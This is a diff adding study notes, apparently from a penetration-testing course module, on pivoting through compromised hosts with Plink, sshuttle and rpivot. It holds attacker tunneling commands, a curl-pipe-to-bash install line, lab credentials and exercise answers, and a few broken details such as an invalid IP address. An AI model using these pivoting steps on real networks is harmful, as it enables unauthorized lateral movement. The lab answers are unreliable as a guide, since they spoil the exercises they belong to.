@@ -367,4 +367,92 @@ msf6>use exploit/multi/handler
 -We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.
 meterpreter>getuid
 
-\\SSH for Windows: Plink
+\\SSH for Windows: Plink.exe
+-Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. Before the Fall of 2018, Windows did not have a native ssh client included, so users would have to install their own. The tool of choice for many a sysadmin who needed to connect to other hosts was PuTTY.
+
+\\Getting To know Plink
+-The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.
+
+\\Using Plink.exe
+$plink -ssh -D 9050 ubuntu@10.129.15.50
+
+-Another Windows-based tool called Proxifier can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.
+-After configuring the SOCKS server for 127.0.0.1 and port 9050, we can directly start mstsc.exe to start an RDP session with a Windows target that allows RDP connections.
+
+\\\\\\\\\\\\\\\\\\\\\==============================================
+SSH Pivoting with Sshuttle
+Sshuttle is a Python tool that creates VPN-like tunnels over SSH, removing the need for proxychains — but it only pivots over SSH (no TOR or HTTPS proxies). It’s handy for automating iptables and adding pivot rules; for example, you can use an Ubuntu pivot to route Nmap or RDP traffic through a remote Windows host.
+-One interesting usage of sshuttle is that we don't need to use proxychains to connect to the remote hosts. Let's install sshuttle via our Ubuntu pivot host and configure it to connect to the Windows host via RDP.
+
+\\Installing sshuttle
+$sudo apt-get install sshuttle
+-To use sshuttle, we specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.
+
+\\Running sshuttle
+$sudo sshuttle -r ubuntu@10.129.282.64 172.16.5.0/23 -V
+-With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.
+
+\\Traffic Routing through iptables Routes
+$sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
+
+<test>Try using sshuttle from Pwnbox to connect via RDP to the Windows target (172.16.5.19) with "victor:pass@123" on the internal network. Once completed type: "I tried sshuttle" as the answer.
+<pending>
+
+\\\\\\\\\\\\=============================================
+Web Server Pivoting with Rpivot
+-Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (172.16.5.135), and we want to access that using the rpivot proxy.
+-We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.
+
+\\Cloning rpivot
+$git clone https://github.com/klsecservices/rpivot.git
+
+\\Installing Python2.7
+$sudo apt-get install python2.7
+
+\\Alternative Installation of Python 2.7
+$curl https://pyenv.run | bash
+$echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
+$echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
+$echo 'eval "$(pyenv init -)"' >> ~/.bashrc
+$source ~/.bashrc
+$pyenv install 2.7
+$pyenv shell 2.7
+-We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.
+
+\\Running Server.py from the attack Host
+$python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+-Before running client.py we will need to transfer rpivot to the target. We can do this using this SCP command:
+
+\\Transferring rpivot to the Target
+$scp -r rpivot ubuntu@<IPaddrTarget>:/home/ubuntu/
+
+\\Running client.py from Pivot Target
+$python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
+
+\\Confirming connection is established
+-We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.
+
+Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.
+
+\\Browsing to the Target Webserver using Proxychains
+$proxychains firefox-esr 172.16.5.135:80
+
+-Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:
+
+\\Connecting to a Web Server using HTTP-Proxy & NTLM auth
+$python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
+
+ SSH to 10.129.121.117 (ACADEMY-PIVOTING-LINUXPIV) with user "ubuntu" and password "HTB_@cademy_stdnt!"
+<test>Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer.
+-Students first need to start the rpivot server using server.py on Pwnbox/PMVPN:
+$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+-Subsequently, students need to transfer the rpivot repository cloned from GitHub to the Ubuntu pivot host, utilizing the credentials ubuntu:HTB_@cademy_stdnt!:
+$scp -r rpivot ubuntu@10.129.202.64:~/
+-Students then need to connect to the Ubuntu pivot host using SSH, utilizing the credentials
+$ssh ubuntu@10.129.202.64
+-Once successfully connected to the pivot host, students need to run "client.py" to connect to the rpivot server that is running on Pwnbox/PMVPN:
+$python2.7 client -py --server-ip PwnIP --server-port 9999
+-Students need to make sure that the following Socks4 entry is present in the /etc/proxychains.conf file:
+$Socks4 127.0.0.1 9050
+-At last, from Pwnbox/PMVPN, students need to use proxychains to open Firefox and browse the root web page of the web server on port 80 of the internal network target 172.16.5.135:
+
